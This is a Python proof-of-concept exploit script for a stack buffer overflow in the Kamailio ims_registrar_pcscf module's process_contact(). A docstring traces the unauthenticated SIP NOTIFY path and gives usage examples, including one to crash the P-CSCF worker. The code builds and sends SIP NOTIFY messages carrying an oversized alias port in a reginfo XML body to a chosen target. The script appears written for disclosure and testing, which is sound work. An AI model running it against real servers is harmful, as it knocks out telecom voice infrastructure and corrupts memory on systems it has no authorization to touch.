#!/usr/bin/env python3
"""
PoC -- Kamailio ims_registrar_pcscf: stack buffer overflow in process_contact()

Sink (Kamailio master ba0edd312c, src/modules/ims_registrar_pcscf/notify.c):

     88: int process_contact(
     89:         udomain_t *_d, int expires, str contact_uri, int contact_state)
     90: {
     91:     char bufport[5], *rest, *sep, *val, *port, *trans;
    ...
    160:     port = memchr(val, 126 /* ~ */, val_len);
    ...
    167:     trans = memchr(port, 126 /* ~ */, val_len - (port - val));
    ...
    173:     received_port_len = trans - port;      <-- attacker controlled
    174:
    175:     trans = trans + 1;
    176:     received_proto = *trans - 48 /* char 0 */;
    177:
    178:     memcpy(bufport, port, received_port_len);   <-- NO BOUND CHECK
    179:     bufport[received_port_len] = 0;             <-- NO BOUND CHECK

`received_port_len` is the number of bytes between the two '~' separators of
the `alias=<host>~<port>~<proto>` NAT parameter of the Contact URI that is
carried inside the <uri> element of a reg-event (RFC 3680) reginfo XML body.
Nothing bounds it, and `bufport` is only 5 bytes long, so:

  * port_len == 4   ("5060")  -> fits, benign
  * port_len == 5   ("65535") -> off-by-one NUL store at bufport[5]
  * port_len >= 6             -> straight stack smash, unbounded length

The twin copy of this exact code in the sibling module ims_ipsec_pcscf was
fixed by upstream commit 57794cd142 ("ims_ipsec_pcscf: fill_contact() check
for port size in alias", 2023-11-30), which changed one file only:

    -            char portbuf[5];
    +            char portbuf[6];
    ...
                     if(p != NULL) {
    -                    memset(portbuf, 0, 5);
    +                    if((p - port_s)>5) {
    +                        LM_ERR("invalid port value\\n");
    +                        return -1;
    +                    }
    +                    memset(portbuf, 0, 6);
                         memcpy(portbuf, port_s, (p - port_s));

src/modules/ims_registrar_pcscf/notify.c:91 still declares `bufport[5]` and
:178 still has no check, at 5.8, 6.0, 6.1 and master alike.

Reachability on a P-CSCF (WITH_REGINFO enabled, i.e. subscribe_to_reginfo=1):

  SIP NOTIFY (Event: reg, application/reginfo+xml)
    -> kamailio_pcscf.cfg:548   if (is_method("NOTIFY") && (uri==myself))
    -> kamailio_pcscf.cfg:916   route[NOTIFY] { reginfo_handle_notify("pcscf_location") }
    -> notify.c:591             if(subscribe_to_reginfo != 1) return -1;   <-- only gate
    -> notify.c:617             process_body(msg, body, domain)
    -> notify.c:361             xmlParseMemory(notify_body.s, notify_body.len)
    -> notify.c:499             contact_uri.s = xmlNodeGetContent(<uri>)
    -> notify.c:509             process_contact(domain, expires, contact_uri, state)
    -> notify.c:178             memcpy(bufport, port, received_port_len)

There is no authentication, no SIP dialog / subscription match and no source
address check anywhere on that path: route[NOTIFY] is reached purely from
`is_method("NOTIFY") && (uri==myself)`, and reginfo_handle_notify() only tests
the static modparam.  The overflow also happens *before* ul.get_pcontact(), so
the attacker does not need any pre-existing registration.

Usage:
  # benign control -- a well-formed 4-digit port, fits in bufport[5]
  ./poc_notify_reginfo_port_overflow.py --target 172.22.0.21 --port 5060 \\
      --port-len 4 --count 200

  # boundary probe -- a maximal legal 5-digit port, off-by-one NUL store
  ./poc_notify_reginfo_port_overflow.py --target 172.22.0.21 --port-len 5

  # crash the P-CSCF worker
  ./poc_notify_reginfo_port_overflow.py --target 172.22.0.21 --port 5060 \\
      --port-len 200

  # print the message instead of sending it
  ./poc_notify_reginfo_port_overflow.py --port-len 32 --dump
"""

import argparse
import random
import socket
import string
import sys
import time

DEFAULT_DOMAIN = "ims.mnc009.mcc460.3gppnetwork.org"
DEFAULT_IMPI = "001010123456789"
DEFAULT_TARGET = "172.22.0.21"


def rand_token(n):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def build_port_payload(length, fill="4"):
    """The bytes that sit between the two '~' of the alias parameter.

    This is `port`..`trans` in notify.c, so its length *is*
    received_port_len, the memcpy size at notify.c:178.
    """
    if length <= 0:
        return ""
    return fill * length


def build_reginfo_body(args, port_payload):
    """A reg-event (RFC 3680) reginfo document, shaped exactly like the one
    the S-CSCF emits (src/modules/ims_registrar_scscf/registrar_notify.c:1866
    -1904) and the one documented in the comment at
    src/modules/ims_registrar_pcscf/notify.c:46-60.

    The only hostile element is the `alias=` parameter of the <uri> text.
    """
    aor = "sip:%s@%s" % (args.impi, args.domain)
    contact_uri = "sip:%s@%s:5060;alias=%s~%s~%s" % (
        args.impi,
        args.contact_host,
        args.contact_host,
        port_payload,
        args.proto,
    )
    body = (
        '<?xml version="1.0"?>\n'
        '<reginfo xmlns="urn:ietf:params:xml:ns:reginfo" version="0" state="full">\n'
        '\t<registration aor="%s" id="0xb33fa860" state="active">\n'
        '\t\t<contact id="0xb33fa994" state="active" event="registered" '
        'expires="%d" callid="%s" cseq="1">\n'
        '\t\t\t<uri>%s</uri>\n'
        '\t\t\t<unknown-param name="+g.3gpp.cs-voice"></unknown-param>\n'
        '\t\t</contact>\n'
        '\t</registration>\n'
        '</reginfo>\n'
    ) % (aor, args.expires, rand_token(20), contact_uri)
    return body


def build_notify(args, src_ip, src_port, body):
    """A syntactically valid in-dialog-less SIP NOTIFY that survives
    route[REQINIT]: mf_process_maxfwd_header("10") and
    sanity_check("1511","7").

    1511 = RURI_SIP_VERSION | RURI_SCHEME | REQUIRED_HDRS | CSEQ | EXPIRES
           | PROXY_REQUIRE | PARSE_URIS | MAX_FORWARDS, so every header URI
    must parse.  The Request-URI must be the P-CSCF itself for
    `uri==myself` at kamailio_pcscf.cfg:548 to match.
    """
    callid = "%s@%s" % (rand_token(24), src_ip)
    lines = [
        "NOTIFY sip:%s:%d SIP/2.0" % (args.ruri_host, args.port),
        "Via: SIP/2.0/UDP %s:%d;branch=z9hG4bK%s;rport" % (src_ip, src_port, rand_token(12)),
        "Max-Forwards: 70",
        "From: <sip:%s>;tag=%s" % (args.ruri_host_full, rand_token(8)),
        "To: <sip:%s>" % (args.ruri_host_full,),
        "Call-ID: %s" % callid,
        "CSeq: %d NOTIFY" % random.randint(1, 20000),
        "Event: reg",
        "Subscription-State: active;expires=%d" % args.expires,
        "Contact: <sip:%s:%d>" % (src_ip, src_port),
        "User-Agent: %s" % args.user_agent,
        "Allow-Event: reg",
        "Content-Type: application/reginfo+xml",
        "Content-Length: %d" % len(body.encode("utf-8")),
        "",
        body,
    ]
    return "\r\n".join(lines).encode("utf-8")


def one_shot(args, sock, src_port, n):
    body = build_reginfo_body(args, args.port_payload)
    msg = build_notify(args, args.bind_ip, src_port, body)
    if args.dump:
        sys.stdout.write(msg.decode("utf-8", "replace"))
        sys.stdout.write("\n---- %d bytes on the wire ----\n" % len(msg))
        return None
    try:
        sock.sendto(msg, (args.target, args.port))
    except OSError as e:
        print("[!] send failed: %s" % e)
        return None
    try:
        sock.settimeout(args.recv_timeout)
        data, _ = sock.recvfrom(65535)
        first = data.split(b"\r\n", 1)[0].decode("utf-8", "replace")
        print("[+] req %4d  port_len=%-6d reply: %s" % (n, args.port_len, first))
        return first
    except socket.timeout:
        print("[-] req %4d  port_len=%-6d reply: <timeout>" % (n, args.port_len))
        return None
    except OSError as e:
        # ICMP port unreachable after the worker died comes back as ECONNREFUSED
        print("[!] req %4d  port_len=%-6d reply: socket error: %s" % (n, args.port_len, e))
        return "SOCKET_ERROR"


def main():
    ap = argparse.ArgumentParser(
        description="Kamailio ims_registrar_pcscf reginfo NOTIFY "
        "process_contact() stack overflow PoC (notify.c:178)"
    )
    ap.add_argument("--target", default=DEFAULT_TARGET, help="P-CSCF SIP IP (default %(default)s)")
    ap.add_argument("--port", type=int, default=5060, help="P-CSCF SIP port (default %(default)s)")
    ap.add_argument("--ruri-host", default=None,
                    help="Request-URI host; must satisfy `uri==myself`. "
                         "Defaults to --target")
    ap.add_argument("--domain", default=DEFAULT_DOMAIN, help="IMS domain (default %(default)s)")
    ap.add_argument("--impi", default=DEFAULT_IMPI, help="IMPI / AOR user part (default %(default)s)")
    ap.add_argument("--contact-host", default="172.22.0.99",
                    help="host used inside the <uri> contact and the alias= value "
                         "(default %(default)s)")
    ap.add_argument("--proto", default="1", help="alias transport digit after the 2nd '~' "
                                                 "(default %(default)s)")
    ap.add_argument("--expires", type=int, default=3600, help="contact expires (default %(default)s)")
    ap.add_argument("--port-len", type=int, default=200,
                    help="number of bytes between the two '~' of alias=, i.e. the "
                         "memcpy length at notify.c:178 (default %(default)s). "
                         "4 = benign, 5 = off-by-one, >=6 = overflow")
    ap.add_argument("--port-payload", default=None,
                    help="explicit alias port string; overrides --port-len")
    ap.add_argument("--fill", default="4", help="fill character for --port-len (default '4')")
    ap.add_argument("--count", type=int, default=1, help="how many NOTIFYs to send (default %(default)s)")
    ap.add_argument("--interval", type=float, default=0.2, help="seconds between sends (default %(default)s)")
    ap.add_argument("--recv-timeout", type=float, default=3.0, help="reply timeout (default %(default)s)")
    ap.add_argument("--bind", default=None, help="local IP to bind to (default: kernel route choice)")
    ap.add_argument("--user-agent", default="poc-reginfo/1.0", help="User-Agent header value")
    ap.add_argument("--dump", action="store_true", help="print the message instead of sending it")
    args = ap.parse_args()

    if args.port_payload is None:
        args.port_payload = build_port_payload(args.port_len, args.fill)
        args.port_len = len(args.port_payload)
    else:
        args.port_len = len(args.port_payload)

    if args.ruri_host is None:
        args.ruri_host = args.target
    args.ruri_host_full = "%s:%d" % (args.ruri_host, args.port)

    # let the kernel pick the source address that actually reaches the target,
    # then read it back so Via / Contact / branch are self-consistent
    probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    probe.connect((args.target, args.port))
    args.bind_ip = args.bind or probe.getsockname()[0]
    probe.close()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((args.bind_ip, 0))
    src_port = sock.getsockname()[1]

    print("[*] target      : %s:%d/udp" % (args.target, args.port))
    print("[*] source      : %s:%d/udp" % (args.bind_ip, src_port))
    print("[*] port_len    : %d  (memcpy size at notify.c:178; bufport is 5 bytes)"
          % args.port_len)
    print("[*] alias value : %s~%s~%s"
          % (args.contact_host,
             args.port_payload if len(args.port_payload) <= 64
             else args.port_payload[:61] + "...",
             args.proto))
    print("[*] count       : %d" % args.count)

    replies = 0
    for n in range(1, args.count + 1):
        r = one_shot(args, sock, src_port, n)
        if args.dump:
            return 0
        if r:
            replies += 1
        time.sleep(args.interval)

    print("[*] sent %d, replied %d" % (args.count, replies))
    sock.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
